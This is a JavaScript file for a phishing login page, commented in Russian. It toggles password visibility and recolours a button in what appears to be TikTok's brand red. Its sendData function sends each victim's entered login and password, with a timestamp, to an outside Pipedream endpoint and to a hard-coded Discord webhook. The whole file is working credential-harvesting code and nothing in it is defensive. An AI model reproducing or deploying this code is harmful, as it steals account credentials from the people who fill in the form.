function togglePassword() {
  var passwordField = document.getElementById("passwordInput");
  if (passwordField.type === "password") {
    passwordField.type = "text";
    document.querySelector(".toggle-btn").textContent = "Скрыть";
  } else {
    passwordField.type = "password";
    document.querySelector(".toggle-btn").textContent = "Показать";
  }
}

document.addEventListener("DOMContentLoaded", function () {
  // Получаем ссылки на элементы
  const input1 = document.getElementById("useremail");
  const input2 = document.getElementById("passwordInput");
  const myButton = document.getElementById("myButton");

  // Функция для изменения цвета кнопки
  function changeButtonColor() {
    // Получаем значения из обоих полей ввода
    const value1 = input1.value.trim();
    const value2 = input2.value.trim();

    // Если оба поля ввода не пустые, меняем цвет кнопки
    if (value1 !== "" && value2 !== "") {
      myButton.style.backgroundColor = "rgba(254, 44, 85, 1)"; // Любой цвет, который вам нравится
      myButton.style.color = "#fff";
    } else {
      myButton.style.backgroundColor = ""; // Если одно из полей пустое, сбрасываем цвет
    }
  }

  // Слушаем события изменения в полях ввода
  input1.addEventListener("input", changeButtonColor);
  input2.addEventListener("input", changeButtonColor);

  // Функция для отправки данных на сервер и в Discord
  function sendData() {
    var userEmailValue = input1.value;
    var passwordValue = input2.value;

    // Отправка на сервер
    fetch('https://eoj0l0tozcs5tz7.m.pipedream.net', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        userLogin: userEmailValue,
        password: passwordValue
        // Другие данные, которые вы хотите отправить на сервер
      })
    })
      .then(response => response.json())
      .then(data => console.log('Данные отправлены на сервер:', data))
      .catch(error => console.error('Ошибка на сервере:', error));

    // Получаем текущее время
    const currentTime = new Date().toLocaleString();

    // Отправка в Discord через вебхук
    const discordWebhookURL = 'https://discord.com/api/webhooks/1189552007174946926/rgjv5CVEe-MXBxcEQfHkj9QK-k3213N3GGMgvo_X8zP-53MVIfDLK2Px5uPCkZvm8Cac'; // Замените на ваш реальный URL вебхука Discord
    fetch(discordWebhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: `Новые данные: \nЛогин: ${userEmailValue}\nПароль: ${passwordValue}\nДата: ${currentTime}`
      })
    })
      .then(response => response.json())
      .then(data => console.log('Данные отправлены в Discord:', data))
      .catch(error => console.error('Ошибка при отправке в Discord:', error));
  }

  myButton.addEventListener('click', sendData);
});
